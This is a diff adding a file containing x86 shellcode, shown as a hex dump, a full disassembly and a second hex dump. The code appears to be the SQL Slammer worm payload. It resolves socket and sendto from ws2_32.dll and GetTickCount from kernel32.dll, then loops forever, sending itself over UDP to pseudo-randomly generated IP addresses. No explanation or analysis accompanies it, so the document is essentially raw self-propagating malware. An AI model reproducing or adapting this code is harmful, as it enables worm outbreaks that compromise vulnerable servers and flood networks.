@@ -1,0 +1,161 @@
+0012F974  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F984  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F994  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9A4  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9B4  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9C4  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9D4  30 60 40 00 EB 0E 01 01 01 01 01 01 01 70 AE 42  0`@..........p..
+0012F9E4  01 70 AE 42 90 90 90 90 90 90 90 90 68 30 60 40  .p..........h0`@
+0012F9F4  00 B8 01 01 01 01 31 C9 B1 18 50 E2 FD 35 01 01  ......1...P..5..
+0012FA04  01 05 50 89 E5 51 68 2E 64 6C 6C 68 65 6C 33 32  ..P..Qh.dllhel32
+0012FA14  68 6B 65 72 6E 51 68 6F 75 6E 74 68 69 63 6B 43  hkernQhounthickC
+0012FA24  68 47 65 74 54 66 B9 6C 6C 51 68 33 32 2E 64 68  hGetTf..lQh32.dh
+0012FA34  77 73 32 5F 66 B9 65 74 51 68 73 6F 63 6B 66 B9  ws2_f..tQhsockf.
+0012FA44  74 6F 51 68 73 65 6E 64 BE 04 50 40 00 8D 45 D4  toQhsend..P@....
+0012FA54  50 FF 16 50 8D 45 E0 50 8D 45 F0 50 FF 16 50 BE  P..P.........P.
+0012FA64  00 50 40 00 8B 1E 8B 03 3D 55 8B EC 51 74 05 BE  .P@.....=U..Qt..
+0012FA74  1C 10 AE 42 FF 16 FF D0 31 C9 51 51 50 81 F1 03  ........1..QP...
+0012FA84  01 48 15 81 F1 01 01 01 01 51 8D 45 CC 50 8B 45  .H.......Q......
+0012FA94  C0 50 FF 16 6A 11 6A 02 6A 02 FF D0 50 8D 45 C4  ....j.j.j.......
+0012FAA4  50 8B 45 C0 50 FF 16 89 C6 09 DB 81 F3 3C 61 D9  P............<a.
+0012FAB4  FF 8B 45 B4 8D 0C 40 8D 14 88 C1 E2 04 01 C2 C1  ......@.........
+0012FAC4  E2 08 29 C2 8D 04 90 01 D8 89 45 B4 6A 10 8D 45  ..)........E....
+0012FAD4  B0 50 31 C9 51 66 81 F1 78 01 51 8D 45 03 50 8B  ..1..f..x.Q...P.
+0012FAE4  45 AC 50 FF D6 EB CA
+ 
+0012F9D8 EB 0E                jmp         0012F9E8
+0012F9DA 01 01                add         dword ptr [ecx],eax
+0012F9DC 01 01                add         dword ptr [ecx],eax
+0012F9DE 01 01                add         dword ptr [ecx],eax
+0012F9E0 01 70 AE             add         dword ptr [eax-52h],esi
+0012F9E3 42                   inc         edx
+0012F9E4 01 70 AE             add         dword ptr [eax-52h],esi
+0012F9E7 42                   inc         edx
+0012F9E8 90                   nop
+0012F9E9 90                   nop
+0012F9EA 90                   nop
+0012F9EB 90                   nop
+0012F9EC 90                   nop
+0012F9ED 90                   nop
+0012F9EE 90                   nop
+0012F9EF 90                   nop
+0012F9F0 68 30 60 40 00       push        406030h
+0012F9F5 B8 01 01 01 01       mov         eax,1010101h
+0012F9FA 31 C9                xor         ecx,ecx
+0012F9FC B1 18                mov         cl,18h
+0012F9FE 50                   push        eax
+0012F9FF E2 FD                loop        0012F9FE
+0012FA01 35 01 01 01 05       xor         eax,5010101h
+0012FA06 50                   push        eax
+0012FA07 89 E5                mov         ebp,esp
+0012FA09 51                   push        ecx
+0012FA0A 68 2E 64 6C 6C       push        6C6C642Eh
+0012FA0F 68 65 6C 33 32       push        32336C65h
+0012FA14 68 6B 65 72 6E       push        6E72656Bh
+0012FA19 51                   push        ecx
+0012FA1A 68 6F 75 6E 74       push        746E756Fh
+0012FA1F 68 69 63 6B 43       push        436B6369h
+0012FA24 68 47 65 74 54       push        54746547h
+0012FA29 66 B9 6C 6C          mov         cx,6C6Ch
+0012FA2D 51                   push        ecx
+0012FA2E 68 33 32 2E 64       push        642E3233h
+0012FA33 68 77 73 32 5F       push        5F327377h
+0012FA38 66 B9 65 74          mov         cx,7465h
+0012FA3C 51                   push        ecx
+0012FA3D 68 73 6F 63 6B       push        6B636F73h
+0012FA42 66 B9 74 6F          mov         cx,6F74h
+0012FA46 51                   push        ecx
+0012FA47 68 73 65 6E 64       push        646E6573h
+0012FA4C BE 04 50 40 00       mov         esi,405004h
+0012FA51 8D 45 D4             lea         eax,[ebp-2Ch]
+0012FA54 50                   push        eax
+0012FA55 FF 16                call        dword ptr [esi]
+0012FA57 50                   push        eax
+0012FA58 8D 45 E0             lea         eax,[ebp-20h]
+0012FA5B 50                   push        eax
+0012FA5C 8D 45 F0             lea         eax,[ebp-10h]
+0012FA5F 50                   push        eax
+0012FA60 FF 16                call        dword ptr [esi]
+0012FA62 50                   push        eax
+0012FA63 BE 00 50 40 00       mov         esi,405000h
+0012FA68 8B 1E                mov         ebx,dword ptr [esi]
+0012FA6A 8B 03                mov         eax,dword ptr [ebx]
+0012FA6C 3D 55 8B EC 51       cmp         eax,51EC8B55h
+0012FA71 74 05                je          0012FA78
+0012FA73 BE 1C 10 AE 42       mov         esi,42AE101Ch
+0012FA78 FF 16                call        dword ptr [esi]
+0012FA7A FF D0                call        eax
+0012FA7C 31 C9                xor         ecx,ecx
+0012FA7E 51                   push        ecx
+0012FA7F 51                   push        ecx
+0012FA80 50                   push        eax
+0012FA81 81 F1 03 01 48 15    xor         ecx,15480103h
+0012FA87 81 F1 01 01 01 01    xor         ecx,1010101h
+0012FA8D 51                   push        ecx
+0012FA8E 8D 45 CC             lea         eax,[ebp-34h]
+0012FA91 50                   push        eax
+0012FA92 8B 45 C0             mov         eax,dword ptr [ebp-40h]
+0012FA95 50                   push        eax
+0012FA96 FF 16                call        dword ptr [esi]
+0012FA98 6A 11                push        11h
+0012FA9A 6A 02                push        2
+0012FA9C 6A 02                push        2
+0012FA9E FF D0                call        eax
+0012FAA0 50                   push        eax
+0012FAA1 8D 45 C4             lea         eax,[ebp-3Ch]
+0012FAA4 50                   push        eax
+0012FAA5 8B 45 C0             mov         eax,dword ptr [ebp-40h]
+0012FAA8 50                   push        eax
+0012FAA9 FF 16                call        dword ptr [esi]
+0012FAAB 89 C6                mov         esi,eax
+0012FAAD 09 DB                or          ebx,ebx
+0012FAAF 81 F3 3C 61 D9 FF    xor         ebx,0FFD9613Ch
+0012FAB5 8B 45 B4             mov         eax,dword ptr [ebp-4Ch]
+0012FAB8 8D 0C 40             lea         ecx,[eax+eax*2]
+0012FABB 8D 14 88             lea         edx,[eax+ecx*4]
+0012FABE C1 E2 04             shl         edx,4
+0012FAC1 01 C2                add         edx,eax
+0012FAC3 C1 E2 08             shl         edx,8
+0012FAC6 29 C2                sub         edx,eax
+0012FAC8 8D 04 90             lea         eax,[eax+edx*4]
+0012FACB 01 D8                add         eax,ebx
+0012FACD 89 45 B4             mov         dword ptr [ebp-4Ch],eax
+0012FAD0 6A 10                push        10h
+0012FAD2 8D 45 B0             lea         eax,[ebp-50h]
+0012FAD5 50                   push        eax
+0012FAD6 31 C9                xor         ecx,ecx
+0012FAD8 51                   push        ecx
+0012FAD9 66 81 F1 78 01       xor         cx,178h
+0012FADE 51                   push        ecx
+0012FADF 8D 45 03             lea         eax,[ebp+3]
+0012FAE2 50                   push        eax
+0012FAE3 8B 45 AC             mov         eax,dword ptr [ebp-54h]
+0012FAE6 50                   push        eax
+0012FAE7 FF D6                call        esi
+0012FAE9 EB CA                jmp         0012FAB5
+
+
+0012F974  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F984  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F994  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9A4  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9B4  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9C4  01 01 01 01 01 01 01 01 01 01 01 01 01 01 01 01  ................
+0012F9D4  30 60 40 00 EB 0E 01 01 01 01 01 01 01 70 AE 42  0`@..........p®B
+0012F9E4  01 70 AE 42 90 90 90 90 90 90 90 90 68 30 60 40  .p®Bh0`@
+0012F9F4  00 B8 01 01 01 01 31 C9 B1 18 50 E2 FD 35 01 01  ......1É±.Pâý5..
+0012FA04  01 05 50 89 E5 51 68 2E 64 6C 6C 68 65 6C 33 32  ..P‰åQh.dllhel32
+0012FA14  68 6B 65 72 6E 51 68 6F 75 6E 74 68 69 63 6B 43  hkernQhounthickC
+0012FA24  68 47 65 74 54 66 B9 6C 6C 51 68 33 32 2E 64 68  hGetTf¹llQh32.dh
+0012FA34  77 73 32 5F 66 B9 65 74 51 68 73 6F 63 6B 66 B9  ws2_f¹etQhsockf.
+0012FA44  74 6F 51 68 73 65 6E 64 BE 04 50 40 00 8D 45 D4  toQhsend..P@.E.
+0012FA54  50 FF 16 50 8D 45 E0 50 8D 45 F0 50 FF 16 50 BE  P..PEàPEðP..P.
+0012FA64  00 50 40 00 8B 1E 8B 03 3D 55 8B EC 51 74 05 BE  .P@.....=U‹ìQt..
+0012FA74  1C 10 AE 42 FF 16 FF D0 31 C9 51 51 50 81 F1 03  ..®B....1ÉQQPñ.
+0012FA84  01 48 15 81 F1 01 01 01 01 51 8D 45 CC 50 8B 45  .H.ñ....QEÌP‹E
+0012FA94  C0 50 FF 16 6A 11 6A 02 6A 02 FF D0 50 8D 45 C4  ÀP..j.j.j..ÐPE.
+0012FAA4  50 8B 45 C0 50 FF 16 89 C6 09 DB 81 F3 3C 61 D9  P‹EÀP..‰Æ	Û.<a.
+0012FAB4  FF 8B 45 B4 8D 0C 40 8D 14 88 C1 E2 04 01 C2 C1  .‹E´.@..ˆÁ...ÂÁ
+0012FAC4  E2 08 29 C2 8D 04 90 01 D8 89 45 B4 6A 10 8D 45  ..)Â...Ø‰E´j.E
+0012FAD4  B0 50 31 C9 51 66 81 F1 78 01 51 8D 45 03 50 8B  °P1ÉQfñx.QE.P.
+0012FAE4  45 AC 50 FF D6 EB CA 
